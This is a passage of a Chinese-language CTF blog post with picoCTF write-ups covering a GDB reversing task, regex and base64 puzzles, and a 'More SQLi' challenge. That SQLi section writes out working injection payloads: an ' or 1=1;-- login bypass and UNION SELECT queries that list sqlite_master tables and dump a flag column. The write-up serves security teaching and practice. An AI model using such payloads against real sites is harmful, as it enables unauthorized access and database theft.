</code></pre>
<p>題目給了一個檔案<code>ret</code>，執行後要輸密碼<br><img src="https://hackmd.io/_uploads/H1IQkCgU2.png"></p>
<p>丟GDB</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">start </span><br><span class="line">c</span><br><span class="line">ctrl^C</span><br><span class="line">ni到死</span><br></pre></td></tr></table></figure>
<p><img src="https://hackmd.io/_uploads/SJHUe0eL3.png"><br>在呼叫strcmp比對密碼時把<code>rsi</code> dump出來，得到前半截flag</p>
<blockquote>
<p>picoCTF{3lf_r3v3r5ing_succe55ful_9ae8528</p>
</blockquote>
<p>重新執行<code>ret</code>，輸入密碼<br><img src="https://hackmd.io/_uploads/HJwZb0l83.png"></p>
<blockquote>
<p>picoCTF{3lf_r3v3r5ing_succe55ful_9ae85289}</p>
</blockquote>
<h2 id="Web-Exploitation"><a href="#Web-Exploitation" class="headerlink" title="Web Exploitation"></a>Web Exploitation</h2><h3 id="More-SQLi"><a href="#More-SQLi" class="headerlink" title="More SQLi"></a>More SQLi</h3><pre><code>AUTHOR: MUBARAK MIKAIL

Description
Can you find the flag on this website.
Additional details will be available after launching your challenge instance.
</code></pre>
<h4 id="Bypass-login"><a href="#Bypass-login" class="headerlink" title="Bypass login"></a>Bypass login</h4><p>進入網頁，經典登入介面<br><img src="https://hackmd.io/_uploads/SkQs-CeL3.png"></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username<span class="operator">=</span>admin<span class="operator">&amp;</span></span><br><span class="line">password<span class="operator">=</span><span class="string">&#x27; or &#x27;</span>a<span class="string">&#x27;=&#x27;</span>a</span><br></pre></td></tr></table></figure>

<p><img src="https://hackmd.io/_uploads/HJnefAeU2.png"><br>題目很貼心把<code>query</code>都print出來給你</p>
<p>調整一下</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username<span class="operator">=</span><span class="number">123</span><span class="operator">&amp;</span></span><br><span class="line">password<span class="operator">=</span><span class="string">&#x27; or 1=1;--</span></span><br></pre></td></tr></table></figure>

<p>進入之後有一個搜尋頁面<br><img src="https://hackmd.io/_uploads/SkTYRu-Uh.png"></p>
<h4 id="測試有幾個欄位"><a href="#測試有幾個欄位" class="headerlink" title="測試有幾個欄位"></a>測試有幾個欄位</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchInput<span class="operator">=</span><span class="string">&#x27; union select 1,2,3;--</span></span><br></pre></td></tr></table></figure>
<p><img src="https://hackmd.io/_uploads/ByxzS0uW83.png"></p>
<h4 id="dump-Table"><a href="#dump-Table" class="headerlink" title="dump Table"></a>dump Table</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchInput<span class="operator">=</span><span class="string">&#x27; or &#x27;</span>a<span class="string">&#x27;=&#x27;</span>a</span><br></pre></td></tr></table></figure>
<p><img src="https://hackmd.io/_uploads/BJwUJt-Ln.png"><br>沒看到<code>flag</code>，可能在別的<code>table</code></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; union select group_concat(sql),2,3 from sqlite_master WHERE type=&#x27;</span><span class="keyword">table</span><span class="string">&#x27;;--</span></span><br></pre></td></tr></table></figure>
<p><img src="https://hackmd.io/_uploads/SkJ-xt-83.png"></p>
<p>現在知道<code>flag</code>應該在<code>more_table</code>的<code>flag_TEXT</code>欄位</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; union select flag,2,3 from more_table;--</span></span><br></pre></td></tr></table></figure>
<p><img src="https://hackmd.io/_uploads/B16UGtZ82.png"></p>
<blockquote>
<p>picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_3b0fca37}</p>
</blockquote>
<h3 id="MatchTheRegex"><a href="#MatchTheRegex" class="headerlink" title="MatchTheRegex"></a>MatchTheRegex</h3><pre><code>AUTHOR: SUNDAY JACOB NWANYIM

Description
How about trying to match a regular expression
Additional details will be available after launching your challenge instance.
</code></pre>
<p>一開始沒看hint不知道到底要幹嘛<br><img src="https://hackmd.io/_uploads/rk36rFZ8h.png"></p>
<p>結果是要match<code>^p.....F!?</code><br><img src="https://hackmd.io/_uploads/SyhyLF-Uh.png"></p>
<p><img src="https://hackmd.io/_uploads/S1jOSFbLn.png"></p>
<blockquote>
<p>picoCTF{succ3ssfully_matchtheregex_9080e406}</p>
</blockquote>
<p>世紀水題</p>
<h3 id="findme"><a href="#findme" class="headerlink" title="findme"></a>findme</h3><pre><code>AUTHOR: GEOFFREY NJOGU

Description
Help us test the form by submiting the username as test and password as test!
Additional details will be available after launching your challenge instance.
</code></pre>
<p>先用<code>test</code> <code>test!</code>登入<br><img src="https://hackmd.io/_uploads/S1Q0_t-U2.png"></p>
<p>進去後他說<em>I was redirected here by a friend of mine but i couldnt find anything. Help me search for flags :-)</em><br><img src="https://hackmd.io/_uploads/SyiWKKbU3.png"></p>
<h4 id="用BurpSuite查看被redirected的頁面"><a href="#用BurpSuite查看被redirected的頁面" class="headerlink" title="用BurpSuite查看被redirected的頁面"></a>用<code>BurpSuite</code>查看被redirected的頁面</h4><p><img src="https://hackmd.io/_uploads/SkjKtK-L2.png"><br>id看起來很像經典base64</p>
<p><img src="https://hackmd.io/_uploads/ryteqKbUh.png"><br><img src="https://hackmd.io/_uploads/HJZycFWLh.png"></p>
<blockquote>
<p>picoCTF{proxies_all_the_way_be716d8e}</p>
</blockquote>
</div></article></div></div><div class="column column-left is-4-tablet is-4-desktop is-4-widescreen  order-1"><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar" src="https://avatars.githubusercontent.com/u/46417323" alt="TriangleSnake"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">TriangleSnake</p><p class="is-size-6 is-block">National Cheng Kung University</p><p class="is-size-6 is-flex justify-content-center"><i class="fas fa-map-marker-alt mr-1"></i><span>Taiwan</span></p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">文章</p><a href="/archives"><p class="title">7</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">分類</p><a href="/categories"><p class="title">2</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">標籤</p><a href="/tags"><p class="title">9</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/TriangleSnake" target="_blank" rel="noopener">追蹤</a></div><div class="level is-mobile is-multiline"><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Github" href="https://github.com/TriangleSnake"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Facebook" href="https://facebook.com"><i class="fab fa-facebook"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Twitter" href="https://twitter.com"><i class="fab fa-twitter"></i></a></div></div></div><!--!--><div class="card widget" data-type="categories"><div class="card-content"><div class="menu"><h3 class="menu-label">分類</h3><ul class="menu-list"><li><a class="level is-mobile" href="/categories/CTF/"><span class="level-start"><span class="level-item">CTF</span></span><span class="level-end"><span class="level-item tag">5</span></span></a><ul><li><a class="level is-mobile" href="/categories/CTF/Cheatsheet/"><span class="level-start"><span class="level-item">Cheatsheet</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li></ul></li></ul></div></div></div><div class="card widget" data-type="recent-posts"><div class="card-content"><h3 class="menu-label">最新文章</h3><article class="media"><div class="media-content"><p class="date"><time dateTime="2024-06-30T06:04:15.000Z">2024-06-30</time></p><p class="title"><a href="/2024/06/30/2024-AIS3-pre-exam-MFCTF-writeup/">2024 AIS3 pre-exam &amp; MFCTF writeup</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2024-05-14T07:44:07.000Z">2024-05-14</time></p><p class="title"><a href="/2024/05/14/%E5%A6%82%E4%BD%95%E5%B9%AB-Proxmox-VM-%E6%93%B4%E5%85%85%E7%A3%81%E7%A2%9F%E5%A4%A7%E5%B0%8F/">如何使用Parted幫 Proxmox VM 擴充磁碟大小</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2024-04-30T07:11:21.000Z">2024-04-30</time></p><p class="title"><a href="/2024/04/30/CTF-Cheatsheet-Web/">CTF Cheatsheet - Web</a></p><p class="categories"><a href="/categories/CTF/">CTF</a> / <a href="/categories/CTF/Cheatsheet/">Cheatsheet</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2024-02-07T07:24:52.000Z">2024-02-07</time></p><p class="title"><a href="/2024/02/07/2023-AIS3-Pre-Exam-writeup/">2023 AIS3 Pre-Exam writeup</a></p><p class="categories"><a href="/categories/CTF/">CTF</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2024-02-06T13:09:56.000Z">2024-02-06</time></p><p class="title"><a href="/2024/02/06/2024-AIS3-EOF-CTF-Qual-writeup/">2024 AIS3 EOF CTF Qual writeup</a></p><p class="categories"><a href="/categories/CTF/">CTF</a></p></div></article></div></div><div class="card widget" data-type="archives"><div class="card-content"><div class="menu"><h3 class="menu-label">彙整</h3><ul class="menu-list"><li><a class="level is-mobile" href="/archives/2024/06/"><span class="level-start"><span class="level-item">六月 2024</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2024/05/"><span class="level-start"><span class="level-item">五月 2024</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2024/04/"><span class="level-start"><span class="level-item">四月 2024</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2024/02/"><span class="level-start"><span class="level-item">二月 2024</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2023/12/"><span class="level-start"><span class="level-item">十二月 2023</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2023/05/"><span class="level-start"><span class="level-item">五月 2023</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li></ul></div></div></div><div class="card widget" data-type="tags"><div class="card-content"><div class="menu"><h3 class="menu-label">標籤</h3><div class="field is-grouped is-grouped-multiline"><div class="control"><a class="tags has-addons" href="/tags/CTF/"><span class="tag">CTF</span><span class="tag">4</span></a></div><div class="control"><a class="tags has-addons" href="/tags/SQLi/"><span class="tag">SQLi</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/command-injection/"><span class="tag">command injection</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/linux/"><span class="tag">linux</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/misc/"><span class="tag">misc</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/proxmox/"><span class="tag">proxmox</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/reverse/"><span class="tag">reverse</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/web/"><span class="tag">web</span><span class="tag">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/writeup/"><span class="tag">writeup</span><span class="tag">5</span></a></div></div></div></div></div></div><!--!--></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/img/triblog.svg" alt="TriBlog" height="28"></a><p class="is-size-7"><span>&copy; 2024 TriangleSnake</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p><p class="is-size-7">© 2024</p></div><div class="level-end"></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script>moment.locale("zh-tw");</script><script>var IcarusThemeSettings = {
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="回到頁首" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
            if (typeof $.fn.lightGallery === 'function') {
                $('.article').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof $.fn.justifiedGallery === 'function') {
                if ($('.justified-gallery > p > .gallery-item').length) {
                    $('.justified-gallery > p > .gallery-item').unwrap();
                }
                $('.justified-gallery').justifiedGallery();
            }
        });</script><!--!--><!--!--><!--!--><!--!--><!--!--><script src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="請輸入關鍵字..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
            loadInsight({"contentUrl":"/content.json"}, {"hint":"請輸入關鍵字...","untitled":"(無標題)","posts":"文章","pages":"頁面","categories":"分類","tags":"標籤"});
        });</script></body></html>